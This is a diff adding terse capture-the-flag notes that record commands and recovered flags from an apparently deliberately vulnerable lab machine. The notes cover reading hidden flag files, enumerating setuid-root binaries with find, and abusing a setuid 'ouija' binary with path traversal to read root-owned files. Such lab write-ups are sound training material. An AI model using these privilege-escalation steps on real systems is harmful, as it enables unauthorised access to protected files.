@@ -1,0 +1,15 @@
+flag1
+	cat /home/luciafer/Documents/flag1.txt
+		flag{cb07e9d6086d50ee11c0d968f1e5c4bf1c89418c}
+flag2
+	cat /home/luciafer/Documents/.flag2.txt
+		flag{728ec98bfaa302b2dfc2f716d3de7869f3eadcbf}
+
+flag3
+	/usr/local/bin/ouija ../home/spookyboi/Documents/flag3.txt
+
+flag4
+	find / -user root -perm -u=s -exec ls -al {} \; 2> /dev/null
+		-rwsr-xr-x 1 root root 16856 Oct  6 10:49 /usr/local/bin/ouija
+	/usr/local/bin/ouija flag4.txt
+		flag{4781cbffd13df6622565d45e790b4aac2a4054dc}
